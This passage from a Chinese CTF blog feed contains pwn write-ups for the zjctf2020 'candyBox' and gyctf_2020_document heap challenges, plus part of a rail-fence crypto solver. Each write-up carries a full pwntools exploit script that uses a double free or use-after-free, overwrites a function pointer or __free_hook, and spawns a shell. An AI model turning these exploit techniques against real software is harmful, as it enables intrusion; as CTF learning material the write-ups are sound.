class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>此时堆布局是这样的：</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/1.png" alt="1"></p><p>箭头所指的两个地方就是要伪造堆块的区域。</p><p>然后free掉第三个第四个第三个的顺序让bin中存在两个相同的堆块，add第一个堆块的时候末尾因为有其它堆块的地址，因此直接改最后一位即可以把fd改成刚刚第二个堆伪造的size区域，等会申请到这里的堆块之后就可以直接修改末尾的指针把这个free big函数改成printf函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br></pre></td></tr></table></figure><p>此时堆布局如下所示</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/2.png" alt="2"></p><p>由于改变了堆结构导致指令无法识别到堆块了，但那些不重要，我们可以看到那个原本存free big的函数已经变成了printf函数的偏移(0x9a0)。</p><p>改完之后呢，依旧是用第三个堆块和第四个堆块double free，然后把堆块申请到第一个伪造的那个地方。然后free第一个堆块，而我们这一次申请就在上面填上类似%p之类的字符，为什么能成功呢？仔细看它delete一个堆块的操作，是以堆块的地址作为参数的而不是以堆块的内容作为参数。所以如果上面放上%p之类的字符串，delete 之后就会printf这堆块上的内容，识别到%p之类的格式化字符串就会对应泄露出一些地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>做完这些操作之后可以看到一下堆块的布局。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/3.png" alt="3"></p><p>free 1之后可以泄露出一个类似libc的地址。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/4.png" alt="4"></p><p>因为这属于无差别泄露，就是说你其实也不知道这个泄露的是个什么鬼东西，那你就直接vmmap查看libc的code段加载地址在哪里，再把这个数和基址一减，得到一个偏移，那么接受到这个数值之后减去那个偏移就能固定泄露出libc的基址了。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/5.png" alt="5"></p><p>虽然泄露出来的地址属于ld.so中的地址，但是由于libc和ld.so是紧挨着的，不妨碍能通过它泄露出libc的地址，最后计算得到偏移0x5ed700。到这里泄露libc的工作就算完成啦。</p><h2 id="劫持程序流"><a href="#劫持程序流" class="headerlink" title="劫持程序流"></a>劫持程序流</h2><p>这里还是靠函数指针，既然libc地址已经泄露得到了，那么可以故技重施，再把函数指针改成system，然后参数给/bin/sh，delete之后直接getshell，非常稳，当然这里我偷懒了，我直接换成onegadget的地址了，因为后期考虑到堆块数量可能不够，它堆块指针的分配机制是这样的：</p><p>建立一个数组a，初始都为0，每次add，会把这个数组置为1，free把对应这个下标置为0。add只会考虑该数组这个下标的值为0的时候才会分配对应偏移的指针给当前add的堆块。但是由于之前我们用过了很多double free，因为有两次free是对同一个堆块操作，那个数组虽然会变成0，但是也有两次是对同一个元素操作了，我们整整又是拿出来了三个堆块，所以每次double free可用的数组指针永久少1，并且由于之前那些操作，可以利用的堆可以说以我目前的能力我是想放弃那些堆块重新开始的。因此再次的double free 只需要劫持一个函数指针为onegadget即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里也很幸运，试到第三个onegadget就成功了。如果不行应该换成system然后之前再同样的方式弄出来/bin/sh字符串就行，但是我不确定堆块数量能不能够用。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10000</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Taste: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./candyBox&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x5ed700</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook:&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>下面是成功getshell的截图，最后写出来需要爆破的就是printf那半个字节，跑到远程环境注意一下应该问题不大。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/6.png" alt="6"></p><h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>本题目来源于zjctf2020决赛的pwn2，据说那题也没多少人做出来，而我虽然能自己独立做出来，但是整整花了9个小时，听说去年决赛总共也就8个小时qwq。</p><p>这真的是我做过的最难的uaf漏洞的题目了，我原本以为它应该就跟那种没有任何特殊字符过滤的sql注入差不多，没想到它到处加限制导致很多漏洞很难利用，也算是给我展示了一波吧，希望这次的省赛能让我出一道pwn吧，加油冲冲冲！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;国庆复的盘，今天补一下&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>gyctf_2020_document write up</title>
    <link href="http://example.com/2021/10/26/gyctf_2020_document/"/>
    <id>http://example.com/2021/10/26/gyctf_2020_document/</id>
    <published>2021-10-26T02:00:00.000Z</published>
    <updated>2021-11-11T13:03:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天来康康这道题<a href="https://buuoj.cn/challenges#gyctf_2020_document">gyctf_2020_document</a></p><span id="more"></span><h2 id="静态分析确定漏洞类型"><a href="#静态分析确定漏洞类型" class="headerlink" title="静态分析确定漏洞类型"></a>静态分析确定漏洞类型</h2><p>经典的堆菜单题，保护全开，2.23的libc。保护全开意味着got表劫持不了。增删改查四样动作都有，并且没有那种虚晃一枪(例如show函数直接给你puts一个too young too simple之类的)的函数。</p><p>先看add函数，malloc了两个堆块，都是固定大小，一个堆块是0x20大小，另一个是0x90大小。然后第二个堆块的指针存在了第一个堆块上面。第一个堆块后八个字节用来存了性别，性别要么1要么16，是通过判断你输入的是否为W来决定的。之后就是那个0x90的大堆块上面存一个名字，中间间隔一个flag，然后堆块偏移0x10的位置上面放上你要输入的内容。</p><p>看看delete函数，存在明显 的UAF漏洞，可以操作free的堆块。并且只free 0x90的堆块而0x20的堆块不会free。那么通过这些分析我们就可以先add两个堆块，free掉第一个之后show第一个就能泄露出libc的地址。</p><p>其它的中规中矩，唯独edit函数正常情况下它每个堆块只允许edit一次，但也只是因为那个0x20堆块的后面的那个flag原因。</p><h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>这里建议，name强制8位就不要想这么多直接给<code>/bin/sh;</code>就完了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>得到libc地址</p><p><img src="/2021/10/26/gyctf_2020_document/1.png" alt="1"></p><h2 id="确定攻击思路"><a href="#确定攻击思路" class="headerlink" title="确定攻击思路"></a>确定攻击思路</h2><p>构造堆重叠以此能修改0x20堆块上面的指针到<code>free_hook</code>去覆盖<code>free_hook</code>为system函数，再free一个带有/bin/sh的堆块就可以getshell，此时bin中已经有一个0x90的<code>unsorted bin</code>，再次add一个因为先分配了这个0x20的堆块，<code>unsorted bin</code>就会进行切割，但是edit 0发现它在0x10偏移上edit的，因此不行。不行咱就再换一个嘛，再add一次，此时的<code>unsorted bin</code>会进入smallbin，但是不影响，还是从上面切割下来作为第四组的小块。然后edit第0个块把这个块的指针改成<code>free_hook</code>。此时第四个堆块的指针被改成了<code>free_hook</code>，那么此时再edit 3为system即可。实际测试需要考虑它在读数据之后会写在那个指针偏移0x10的地方写数据，所以前面我们edit的时候也把它改成<code>free_hook</code>-0x10。最后edit 3 为system函数。由于这个输入是for() read(0,buf,1)读取的，因此0x70个字节必须写满，那边由于都是hook，我们都清空较为保险，因为万一不小心调用到了那边的hook很容易crash，那么exp根据以上思路很容易得到了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;node4.buuoj.cn&#x27;,26476)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">def add(name,sex,payload):#8,1,0x70</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;1&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;name&#x27;,name)</span><br><span class="line">    p.sendafter(b&#x27;sex&#x27;,sex,timeout=0.01)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line">def edit(index,sex,payload):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line">    if sex:p.sendlineafter(b&#x27;?&#x27;,b&#x27;Y&#x27;)</span><br><span class="line">    else:p.sendlineafter(b&#x27;?&#x27;,&#x27;N&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(0,&#x27;./gyctf_2020_document&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;a&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;b&#x27;*0x70)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\0&#x27;))-88-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">success(&#x27;libc:&#x27;+hex(libc_addr))</span><br><span class="line">success(&#x27;free_hook&#x27;+hex(libc_addr+libc.sym[&#x27;__free_hook&#x27;]))</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;c&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;d&#x27;*0x70)</span><br><span class="line">edit(0,0,b&#x27;d&#x27;*0x10+p64(libc_addr+libc.sym[&#x27;__free_hook&#x27;]-0x10)+b&#x27;d&#x27;*0x58)</span><br><span class="line">edit(3,0,p64(libc_addr+libc.sym[&#x27;system&#x27;])+b&#x27;e&#x27;*0x68)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2021/10/26/gyctf_2020_document/2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天来康康这道题&lt;a href=&quot;https://buuoj.cn/challenges#gyctf_2020_document&quot;&gt;gyctf_2020_document&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>2021浙江省预赛</title>
    <link href="http://example.com/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/"/>
    <id>http://example.com/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/</id>
    <published>2021-10-23T14:00:00.000Z</published>
    <updated>2021-11-11T13:03:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者因为之前电脑丢了导致中间两个月断更，最近会把之前的很多都补回来。言归正传，这次比赛总体来说不太理想，没有达到预期。</p><span id="more"></span><h2 id="比赛情况总结"><a href="#比赛情况总结" class="headerlink" title="比赛情况总结"></a>比赛情况总结</h2><p>我，学姐，学长分别出一题，最终得分350，排名在42。而我是出了一道密码题，pwn题没出，因为pwn题一道shellcode题当时分析没有考虑\0截断的这个特性，以为所有shellcode都要满足这个特性，觉得手撕汇编撕不过，就放弃了，没想到竟是一个\0绕过，这波，属实大意了闪了。</p><h2 id="部分题目writeup"><a href="#部分题目writeup" class="headerlink" title="部分题目writeup"></a>部分题目writeup</h2><h3 id="Crypto-Easy-Railfence"><a href="#Crypto-Easy-Railfence" class="headerlink" title="Crypto-Easy Railfence"></a>Crypto-Easy Railfence</h3><p>观察加密方式，发现这个加密只进行了位置对换，并且开头特意提醒flag的形式为 flag{} ，那么先根据 已有长度写出参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>现在Rail和offset不确定，但是 flag的格式确定，因此对参数进行爆破，然后观察发现l和g还有{}在整个 给的加密结果中只有一个并且位置已经确定，那么根据这个特性写出如下脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encrypt函数将结尾的print (d)改成了return d</span></span><br><span class="line"><span class="keyword">for</span> Rail <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line"><span class="keyword">for</span> Offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line"><span class="keyword">if</span> encrypt(m, Rail , Offset)[<span class="number">23</span>:<span class="number">25</span>]==<span class="string">&#x27;&#125;l&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(Rail,Offset)</span><br></pre></td></tr></table></figure><p>得到两个结果 13 5和13 29，填充位位数多了应该有一定的规律，因此offset取5即可。</p><p> 由于这个加密方式只交换位置，因此我在某一位多的一个字符必然会在另一个位置一模一样的出现，将 已匹配的字符数作为该为有没有匹配的条件逐位爆破即可，以下为完整脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target=<span class="string">&#x27;reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">c,rails,offset</span>):</span></span><br><span class="line">c = <span class="string">&#x27;$&#x27;</span> * offset + c</span><br><span class="line">length = <span class="built_in">len</span>(c)</span><br><span class="line">result = &#123;x: <span class="string">&quot;&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(rails)&#125;</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">width = rails * <span class="number">2</span> - <span class="number">2</span></span><br><span class="line">        num = a % width</span><br><span class="line">        <span class="keyword">if</span> (num &lt; rails):</span><br><span class="line">    result.update(&#123;num: result[num] + c[a]&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            ll = <span class="number">2</span> * rails - <span class="number">2</span> - num</span><br><span class="line">            result.update(&#123;ll: result[ll] + c[a]&#125;)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(rails):</span><br><span class="line">    d = d + result[k]</span><br><span class="line">    d = d.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span>(<span 